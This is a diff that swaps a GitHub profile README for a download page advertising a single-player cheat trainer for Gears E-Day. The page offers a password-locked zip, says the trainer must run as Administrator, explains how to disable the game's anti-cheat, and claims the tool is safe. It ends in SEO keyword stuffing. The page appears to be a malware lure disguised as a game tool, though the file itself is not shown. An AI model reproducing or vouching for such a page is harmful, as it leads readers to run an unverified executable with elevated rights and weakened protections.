@@ -1,17 +1,82 @@
-# 👨‍💻 StormOloor41488
+<div align="center">
+  <img width="1983" height="793" alt="image" src="https://github.com/user-attachments/assets/2494352e-b1fb-4c37-bc16-fc3acdc715de" />
+  <h1>Gears E-Day Trainer</h1>
+  <p><strong>A comprehensive single-player trainer designed specifically to enhance your campaign experience in Gears E-Day.</strong></p>
+</div>
 
-### 👨‍💻 About me
-
-- 🔭 I'm currently working on **a streaming data processor**
-- 🌱 I'm currently learning **Kubernetes internals**
-- 👯 I'm looking to write technical articles
-- 💬 Ask me about anything related to **message queues**
-- 📫 How to reach me: via [StormOloor41488](https://github.com/StormOloor41488)
-
-### 🛠️ Languages and Tools
-
-C++, Rust, Python, JavaScript, Lua
+<p align="center">
+  <a href="https://github.com/StormOloor41488/Gears-E-Day-Trainer/releases/download/1/Gears-E-DayTrainer.zip">
+    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
+  </a>
+  <br><br>
+  🔐 <b>Password:</b> <code>2026</code>
+</p>
 
 ---
 
-See you around 👋 — [StormOloor41488](https://github.com/StormOloor41488)
+## 📖 What is this?
+
+**Gears E-Day Trainer** is a powerful external utility built to give you full control over your single-player campaign in the prequel to the iconic Gears franchise. 
+
+If you want to experience the story without the difficulty spikes, test out weapons, or simply explore the environment freely, this trainer provides all the necessary tools. It operates externally, ensuring that your base game files remain untouched while you play.
+
+---
+
+## ✨ Core Capabilities
+
+| Module | Description |
+| :--- | :--- |
+| **Survivability** | Activate God Mode, Infinite Health, and Instant Reload to survive any firefight. |
+| **Weapon Enhancements** | Toggle Infinite Ammo, One-Hit Kill, Super Accuracy, and zero Recoil/Spread. |
+| **Movement & Physics** | Utilize Super Speed, Super Jump, and No Clip to traverse the map. |
+| **World Control** | Adjust the overall Game Speed and Freeze Enemies in place. |
+
+---
+
+## 🎮 Game Compatibility
+
+This specialized trainer is fully optimized for:
+
+- 🔹 **Gears E-Day** (Campaign Mode only).
+
+*(Note: The trainer requires Easy Anti-Cheat (EAC) to be disabled for offline play. You can achieve this by setting the environment variable `EOS_USE_ANTICHEATCLIENTNULL=1` before launching the game.)*
+
+---
+
+## 🛠️ Usage Guidelines
+
+1. **Download** the latest release from the button at the top.
+2. **Extract** the archive using the password: `2026`.
+3. **Launch** Gears E-Day and load into your campaign.
+4. **Run** the trainer as Administrator.
+5. **Press the hotkeys** to toggle the features you want to use.
+
+> ⚠️ **Disclaimer:** **Single-player only.** This trainer is designed for Campaign Mode and must not be used in online modes (Versus, Horde Siege). Using any trainer in online mode will result in a permanent Xbox account ban.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Is this tool safe to use?**
+A: Yes, provided you only use it in offline Campaign Mode. It operates externally and does not permanently modify your game installation.
+
+**Q: Does it work with Easy Anti-Cheat (EAC)?**
+A: No. You must disable EAC for offline play to use the trainer.
+
+**Q: Can I use it in Horde or Versus?**
+A: **No.** Using the trainer in any online mode will result in an immediate and permanent ban.
+
+**Q: How do I uninstall it?**
+A: Simply close the trainer and delete the folder. No system files are modified.
+
+---
+
+## 🔍 SEO Keywords & Search Terms
+
+`gears e-day trainer`, `gears e-day cheat`, `gears e-day hack`, `gears e-day mod menu`, `gears e-day god mode`, `gears e-day infinite ammo`, `gears e-day one hit kill`, `gears e-day no recoil`, `gears e-day super accuracy`, `gears e-day campaign trainer`, `gears e-day single player`, `gears e-day pc trainer`, `gears e-day 2026`, `gears e-day guide`, `gears e-day download`, `gears e-day hotkeys`, `gears e-day eac disable`, `gears e-day eos_use_anticheatclientnull`, `gears e-day offline`, `gears e-day trainer free`, `gears e-day trainer windows`, `gears e-day trainer download`
+
+---
+
+<div align="center">
+  <p>Built for the community. Dominate the campaign.</p>
+</div>
